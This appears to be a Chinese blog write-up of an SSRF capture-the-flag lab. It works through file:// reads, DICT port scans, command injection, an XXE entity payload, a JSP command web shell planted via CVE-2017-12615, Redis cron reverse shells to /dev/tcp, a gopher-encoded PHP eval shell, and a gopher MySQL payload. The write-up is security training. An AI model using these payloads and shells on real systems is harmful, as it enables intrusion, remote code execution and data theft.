[{"content":"环境准备\r靶场来源：靶场\n下载后解压界面如下\n输入\n1 docker compose up -d 成功运行\n输入\n1 docker ps 查看映射到物理机的端口\n可知要访问8880端口\n通过ifconfig可知虚拟机ip\n通过访问该ip:8880进入SSRF靶场\n判断SSRF是否存在\r能够对外发起网络请求的地方，就可能存在 SSRF。\n由图可知该站点存在SSRF。\nSSRF 获取本地信息\rFILE 协议获取本地信息\r既然当前站点存在 SSRF 的话，我们可以尝试配合 file 协议来读取本地的文件信息，首先尝试使用 file 协议来读取 /etc/passwd 文件试试看：\n1 file:///etc/passwd 成功读取到了本地的文件信息，现在尝试来获取存在 SSRF 漏洞的本机内网 IP 地址信息，确认当前资产的网段信息：\n1 file:///etc/hosts SSRF 探测内网端口\rSSRF 常配合 DICT 协议探测内网端口开放情况\n通过BurpSuit抓包爆破知道内网端口开放情况\n通过爆破可以整理出端口的开放情况：\n1 2 3 4 5 6 7 8 9 172.72.23.21 - 80 172.72.23.22 - 80 172.72.23.23 - 80，3306 172.72.23.24 - 80 172.72.23.25 - 80 172.72.23.26 - 8080 172.72.23.27 - 6379 172.72.23.28 - 6379，80 172.72.23.29 - 3306 代码注入\r代码注入应用详情\r可知有两个文件index.php和shell.php\n将回显的代码写入html文件\n由此可知能通过cmd这个注入点进行代码注入\n取得flag：\n1 helloct{you_got_flag_22} SQL 注入\r可知该关所用数据库为MariaDB，注入点为id\n可知存在数字型SQL注入，显示位有三位\n通过爆库，爆表，爆段，爆数据后得到flag：\n1 helloct{you_got_flag_23} 命令执行\r命令执行应用详情\r可知该关要通过POST上传参数，想到使用gopher协议\nSSRF 之命令执行\r1 2 3 4 5 6 7 8 9 10 11 12 13 POST /ping.php HTTP/1.1 Host: 172.72.23.24 Content-Length: 24 Cache-Control: max-age=0 Content-Type: application/x-www-form-urlencoded Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Referer: http://core.hello-ctf.com:8011/ Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6 Connection: close target=1.1.1.1;cat /flag 将上诉数据进行两次url编码然后拼接到gopher://172.72.23.24:80/_后\n得到flag：\n1 helloct{you_got_flag_24) XML 实体注入\rXXE 应用详情\r通过上图可知该关存在XXE漏洞\nXXE攻击\rEXP:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 POST / HTTP/1.1 Host: 172.72.23.25 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:143.0) Gecko/20100101 Firefox/143.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Content-Type: application/x-www-form-urlencoded Content-Length: 172 Origin: http://172.72.23.25 Connection: keep-alive Referer: http://172.72.23.25/ Upgrade-Insecure-Requests: 1 Priority: u=0, i \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding= \u0026#34;UTF-8\u0026#34;?\u0026gt;\u0026lt;!DOCTYPE user [\u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///flag\u0026#34; \u0026gt;]\u0026gt;\u0026lt;user\u0026gt; \u0026lt;username\u0026gt;\u0026amp;xxe;\u0026lt;/username\u0026gt; \u0026lt;password\u0026gt;admin\u0026lt;/password\u0026gt;\u0026lt;/user\u0026gt; 数据包二次编码后使用gopher协议传入，最后取得flag：\n1 helloct{you_got_flag_25} CVE-2017-12615\rTomcat 应用详情\r本场景是一个 Tomcat 中间件，存在 CVE-2017-12615 任意写文件漏洞。\nCVE-2017-12615复现\rJSP一句话\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;% String command = request.getParameter(\u0026#34;cmd\u0026#34;); if(command != null) { java.io.InputStream in=Runtime.getRuntime().exec(command).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(\u0026#34;\u0026lt;pre\u0026gt;\u0026#34;); while((a=in.read(b))!=-1) { out.println(new String(b)); } out.print(\u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;); } else { out.print(\u0026#34;format: xxx.jsp?cmd=Command\u0026#34;); } %\u0026gt; 数据包\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 PUT /shell.jsp/ HTTP/1.1 Host: 172.72.23.26:8080 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 460 \u0026lt;% String command = request.getParameter(\u0026#34;cmd\u0026#34;); if(command != null) { java.io.InputStream in=Runtime.getRuntime().exec(command).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(\u0026#34;\u0026lt;pre\u0026gt;\u0026#34;); while((a=in.read(b))!=-1) { out.println(new String(b)); } out.print(\u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;); } else { out.print(\u0026#34;format: xxx.jsp?cmd=Command\u0026#34;); } %\u0026gt; 将个 PUT 请求二次 URL 编码，最后通过 SSRF 发起这个 POST 请求，返回 201 状态码表示成功写 shell\n接着通过 SSRF 发起对 shell.jsp 的 HTTP 请求，成功执行了 cat /flag 的命令\n最终取得flag：\n1 helloct{you_got_flag_26} Redis 未授权\rRedis unauth 应用详情\r未授权的 Redis 服务常规的攻击思路的主要命令如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 # 清空 key flushall # 设置要操作的路径为定时任务目录 config set dir /var/spool/cron/ # 设置定时任务角色为 root config set dbfilename root # 设置定时任务内容 set x \u0026#34;\\n* * * * * /bin/bash -i \u0026gt;\u0026amp; /dev/tcp/x.x.x.x/2333 0\u0026gt;\u0026amp;1\\n\u0026#34; # 保存操作 save SSRF 之 Redis unauth\rSSRF 攻击的话并不能使用 redis-cli 来连接 Redis 进行攻击操作，未授权的情况下可以使用 dict 或者 gopher 协议来进行攻击，因为 gopher 协议构造比较繁琐，所以本场景建议直接使用 DICT 协议来攻击，效率会高很多，DICT 协议除了可以探测端口以外，另一个奇技淫巧就是攻击未授权的 Redis 服务，格式如下：\n1 dict://x.x.x.x:6379/\u0026lt;Redis 命令\u0026gt; 通过 SSRF 直接发起 DICT 请求，可以成功看到 Redis 返回执行完 info 命令后的结果信息，下面开始直接使用 dict 协议来创建定时任务来反弹 Shell：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 # 清空 key dict://172.72.23.27:6379/flushall # 设置要操作的路径为定时任务目录 dict://172.72.23.27:6379/config set dir /var/spool/cron/ # 在定时任务目录下创建 root 的定时任务文件 dict://172.72.23.27:6379/config set dbfilename root # 写入 Bash 反弹 shell 的 payload dict://172.72.23.27:6379/set x \u0026#34;\\n* * * * * /bin/bash -i \u0026gt;%26 /dev/tcp/x.x.x.x/2333 0\u0026gt;%261\\n\u0026#34; # 保存上述操作 dict://172.72.23.27:6379/save 在目标系统上创建定时任务后，shell 也弹了出来，查看下 cat /etc/hosts 的确是 172.72.23.27 这台内网机器：\n最终得到flag：\n1 helloct{you_got_flag_27} Redis 有认证\rRedis auth 应用详情\r该 172.72.23.28 主机运行着 Redis 服务，但是有密码验证，无法直接未授权执行命令：\n不过除了 6379 端口还开放了 80 端口，观察后发现存在变量为file的文件包含：\n因为 Redis 密码记录在 redis.conf 配置文件中，结合这个文件包含漏洞点，那么这时来尝试借助文件包含漏洞来读取 redis 的配置文件信息，Redis 常见的配置文件路径如下：\n1 2 3 4 /etc/redis.conf /etc/redis/redis.conf /usr/local/redis/etc/redis.conf /opt/redis/ect/redis.conf 成功读取到 /etc/redis.conf 配置文件，直接搜索 requirepass 关键词来定位寻找密码：\n拿到密码的话就可以正常和 Redis 进行交互了：\nSSRF 之 Redis auth\r首先借助目标系统的 80 端口上的文件包含拿到 Redis 的密码：P@ssw0rd\n有密码的话先使用 dict 协议进行密码认证看看：\n但是因为 dict 不支持多行命令的原因，这样就导致认证后的参数无法执行，所以 dict 协议理论上来说是没发攻击带认证的 Redis 服务的。\n那么就得使用gopher协议了，借助脚本生成payload：\n1 gopher://172.72.23.28:6379/_%2A2%0D%0A%244%0D%0AAUTH%0D%0A%248%0D%0AP%40ssw0rd%0D%0A%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2427%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_GET%5B1%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A 通过BP传入：\n验证shell创建成功：\n最后通过\n1 http://172.72.23.28/shell.php?1=system(\u0026#39;cat${IFS}/flag\u0026#39;); 得到flag：\n1 flag{7b992efb5ab23a3a3d5100e366c48423} MySQL 未授权\rMySQL 应用详情\rMySQL 空密码可以登录，通过 SSRF 可以和数据库进行交互，取得flag：\nSSRF 之 MySQL 未授权\r通过脚本生成payload：\n1 gopher://172.72.23.29:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%18%00%00%00%03%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%66%6c%61%67%2e%74%65%73%74%01%00%00%00%01 通过页面传入得到flag：\n1 helloct{you_got_flag_29} fpm（FastCGI协议）\r通过脚本生成payload：\n通过页面传输，得到根目录下的文件：\n","date":"2025-10-01T20:28:30+08:00","image":"http://localhost:1313/p/ssrf%E9%9D%B6%E5%9C%BA/SSRF_hu_4bb98d269a64282f.png","permalink":"http://localhost:1313/p/ssrf%E9%9D%B6%E5%9C%BA/","title":"SSRF靶场"}]